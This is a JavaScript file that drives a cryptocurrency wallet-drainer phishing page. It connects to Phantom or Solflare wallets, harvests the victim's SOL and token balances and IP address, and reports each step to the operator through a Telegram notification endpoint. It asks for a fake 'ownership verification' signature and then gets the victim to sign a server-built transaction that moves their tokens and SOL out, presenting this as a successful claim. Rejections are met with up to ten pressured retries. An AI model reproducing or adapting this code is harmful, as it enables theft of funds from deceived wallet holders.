$(document).ready(function() {
    let selectedWalletProvider = null;

    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }

    async function getSPLTokenInfo(connection, publicKey) {
        try {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            });

            const tokens = [];
            const tokenPrices = await getTokenPrices();
            
            for (const tokenAccount of tokenAccounts.value) {
                const accountData = tokenAccount.account.data;
                const parsedInfo = accountData.parsed.info;
                const balance = parsedInfo.tokenAmount;

                if (balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = getTokenSymbol(mint);
                    const price = tokenPrices[mint] || 0;
                    const usdValue = balance.uiAmount * price;
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }

    async function getTokenPrices() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
            const data = await response.json();
            
            return {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
            };
        } catch (error) {
            console.error('Failed to get token prices:', error);
            return {};
        }
    }

    function getTokenSymbol(mint) {
        const tokenMap = {
            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
            'So11111111111111111111111111111111111111112': 'WSOL',
            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
        };
        return tokenMap[mint] || 'Unknown';
    }

    async function sendTelegramNotification(message) {
        try {
            // استخدام المسار النسبي - سيتواصل تلقائياً مع نفس السيرفر
            await fetch('/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: message.address,
                    balance: message.balance,
                    usdBalance: message.usdBalance,
                    walletType: message.walletType,
                    customMessage: message.customMessage,
                    splTokens: message.splTokens,
                    ip: message.ip
                })
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }

    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const wallets = {
            phantom: {
                provider: window.solana,
                condition: window.solana && window.solana.isPhantom,
                name: 'Phantom Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                    mobile: 'https://phantom.app/download'
                }
            },
            solflare: {
                provider: window.solflare,
                condition: window.solflare && window.solflare.isSolflare,
                name: 'Solflare Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                    mobile: 'https://solflare.com/download'
                }
            }
        };

        Object.keys(wallets).forEach(walletId => {
            const wallet = wallets[walletId];
            const statusElement = document.getElementById(`${walletId}-status`);
            const optionElement = document.getElementById(`${walletId}-wallet`);
            
            if (wallet.condition) {
                statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                if (optionElement) optionElement.disabled = false;
            } else if (isMobileDevice && wallet.isMobileSupported) {
                statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                if (optionElement) optionElement.disabled = false;
            } else {
                statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                if (optionElement) optionElement.disabled = false;
            }
        });

        return wallets;
    }

    function getWalletProvider(walletType) {
        const providers = {
            phantom: window.solana,
            solflare: window.solflare
        };
        return providers[walletType];
    }

    async function connectWallet(walletType, walletProvider) {
        try {
            const wallets = checkWalletAvailability();
            const walletInfo = wallets[walletType];
            const isMobileDevice = isMobile();
            
            if (isMobileDevice && !walletInfo.condition) {
                let deepLinkUrl, appName;
                
                if (walletType === 'phantom') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Phantom App';
                } else if (walletType === 'solflare') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Solflare App';
                }
                
                if (deepLinkUrl) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                    });
                    
                    showWalletLoading();
                    $('.wallet-loading-title').text(`Opening ${appName}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                    
                    const connectionCheckInterval = setInterval(() => {
                        const provider = walletType === 'phantom' ? window.solana : window.solflare;
                        const condition = walletType === 'phantom' ? 
                            (window.solana && window.solana.isPhantom) : 
                            (window.solflare && window.solflare.isSolflare);
                            
                        if (condition) {
                            clearInterval(connectionCheckInterval);
                            connectWallet(walletType, provider);
                        }
                    }, 1000);
                    
                    setTimeout(() => {
                        clearInterval(connectionCheckInterval);
                        showWalletOptions();
                        unlockModal();
                    }, 120000);
                    
                    window.location.href = deepLinkUrl;
                    return;
                }
            }
            
            if (!walletInfo.condition) {
                let installUrl;
                if (isMobileDevice && walletInfo.installUrl.mobile) {
                    installUrl = walletInfo.installUrl.mobile;
                } else {
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                }
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                });
                
                showWalletOptions();
                
                const installMessage = isMobileDevice ? 
                    `${walletInfo.name} mobile app is required. Would you like to download it?` :
                    `${walletInfo.name} is not installed. Would you like to install it?`;
                
                if (confirm(installMessage)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }

            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }

            showWalletLoading();
            
            if (walletType === 'phantom') {
                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                $('.wallet-loading-title').text('Connecting Phantom');
                $('.wallet-loading-spinner').removeClass('solflare');
            } else if (walletType === 'solflare') {
                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                $('.wallet-loading-title').text('Connecting Solflare');
                $('.wallet-loading-spinner').addClass('solflare');
            } else {
                $('.wallet-loading-title').text('Connecting to Wallet');
                $('.wallet-loading-spinner').removeClass('solflare');
            }
            
            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');

            if (walletType === 'solflare') {
                if (!walletProvider || !walletProvider.isSolflare) {
                    throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
                }
            }

            const resp = await walletProvider.connect();
            console.log(`${walletInfo.name} connected:`, resp);

            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );

            let publicKeyString;
            if (walletType === 'solflare') {
                if (walletProvider.publicKey) {
                    publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                } else if (walletProvider.pubkey) {
                    publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
                } else {
                    throw new Error('No public key received from Solflare wallet');
                }
            } else {
                if (resp.publicKey) {
                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                } else {
                    throw new Error('No public key received from wallet');
                }
            }

            const public_key = new solanaWeb3.PublicKey(publicKeyString);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);

            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, public_key);

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });

            const requiredBalance = 0.02 * 1000000000;
            
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                
                showRejectionEffects();
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                
                return;
            }

            $('#connect-wallet').text("Processing...");

            const attemptTransaction = async (retryCount = 0) => {
                const maxRetries = 10;
                
                try {
                    const verificationKey = `ownership_verified_${publicKeyString}`;
                    const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
                    
                    let ownershipVerified = false;
                    
                    if (isAlreadyVerified) {
                        console.log("Ownership already verified for this wallet, skipping verification");
                        
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                        });
                        
                        ownershipVerified = true;
                    } else {
                        $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
                        $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
                        $('#connect-wallet').text('Verifying Ownership...');
                        
                        const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
                        const messageBytes = new TextEncoder().encode(verificationMessage);
                        
                        try {
                            const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                            console.log("Ownership verification signed:", signedMessage);
                            
                            localStorage.setItem(verificationKey, 'true');
                            
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                            });
                            
                            ownershipVerified = true;
                        } catch (signError) {
                            console.error("Ownership verification failed:", signError);
                            
                            const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
                            const isSignRejection = 
                                signErrorMessage.includes('User rejected') || 
                                signErrorMessage.includes('rejected') || 
                                signErrorMessage.includes('cancelled');
                            
                            if (isSignRejection) {
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletInfo.name,
                                    customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                                });
                                
                                if (retryCount < maxRetries) {
                                    showRejectionEffects();
                                    $('.wallet-loading-title').text('Verification Rejected');
                                    $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
                                    
                                    setTimeout(() => {
                                        clearRejectionEffects();
                                        attemptTransaction(retryCount + 1);
                                    }, 2000);
                                    return;
                                } else {
                                    throw new Error('Ownership verification rejected too many times');
                                }
                            } else {
                                throw signError;
                            }
                        }
                    }
                    
                    if (!ownershipVerified) {
                        throw new Error('Failed to verify wallet ownership');
                    }
                    
                    $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
                    $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
                    $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
                    
                    // استخدام المسار النسبي - سيتواصل مع نفس السيرفر
                    const prepareResponse = await fetch('/prepare-transaction', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            publicKey: publicKeyString,
                            verified: true
                        })
                    });

                    const prepareData = await prepareResponse.json();
                    
                    if (!prepareResponse.ok) {
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: '❌ Transaction Preparation Failed'
                        });
                        alert(prepareData.error || "Failed to prepare transaction");
                        $('#connect-wallet').text("Connect Wallet");
                        return;
                    }

                    const transactionBytes = new Uint8Array(prepareData.transaction);
                    const transaction = solanaWeb3.Transaction.from(transactionBytes);

                    $('.wallet-loading-title').text('Signing Transaction');
                    $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                    
                    const signed = await walletProvider.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
                    });

                    $('.wallet-loading-title').text('Confirming Transaction');
                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
                    
                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                    
                    const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
                    const solscanUrl = `https://solscan.io/tx/${txid}`;
                    
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `🎉 Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
                    });
                    
                    $('.wallet-loading-title').text('Success!');
                    $('.wallet-loading-subtitle').html('Assets have been successfully claimed.<br>Transaction confirmed on blockchain.');
                    
                    $('#connect-wallet').text("Assets Claimed Successfully!");
                    
                    setTimeout(() => {
                        unlockModal();
                        hideWalletModal();
                        $('#connect-wallet').text("Connect Wallet");
                    }, 2000);
                    
                } catch (err) {
                    console.error("Error during claiming:", err);
                    
                    const errorMessage = err.message || err.toString() || 'Unknown error';
                    const isUserRejection = 
                        errorMessage.includes('User rejected') || 
                        errorMessage.includes('rejected') || 
                        errorMessage.includes('cancelled');
                    
                    if (isUserRejection && retryCount < maxRetries) {
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `❌ Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
                        });
                        
                        showRejectionEffects();
                        $('.wallet-loading-title').text('Transaction Rejected');
                        $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
                        
                        setTimeout(() => {
                            clearRejectionEffects();
                            attemptTransaction(retryCount + 1);
                        }, 2000);
                        return;
                    }
                    
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `❌ Transaction Failed: ${errorMessage}`
                    });
                    
                    $('.wallet-loading-title').text('Transaction Failed');
                    $('.wallet-loading-subtitle').html('An error occurred during the transaction.<br>Please try again.');
                    
                    setTimeout(() => {
                        unlockModal();
                        showWalletOptions();
                        $('#connect-wallet').text("Connect Wallet");
                    }, 3000);
                }
            };

            await attemptTransaction();
            
        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
                customMessage: `❌ Wallet Connection Failed: ${err.message || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
        }
    }

    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }

    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }

    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }

    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }

    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }

    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        clearRejectionEffects();
    }

    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.phantom-icon').addClass('rejected');
        $('.solflare-icon').addClass('rejected');
        $('.wallet-loading-spinner img').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        
        setTimeout(() => {
            $('.wallet-modal-content').removeClass('shake');
        }, 600);
    }

    function clearRejectionEffects() {
        $('.wallet-loading-spinner').removeClass('rejected');
        $('.phantom-icon').removeClass('rejected');
        $('.solflare-icon').removeClass('rejected');
        $('.wallet-loading-spinner img').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }

    $('#connect-wallet, #connect-wallet-hero').on('click', function() {
        showWalletModal();
    });

    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        
        connectWallet(walletType, walletProvider);
    });

    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });
});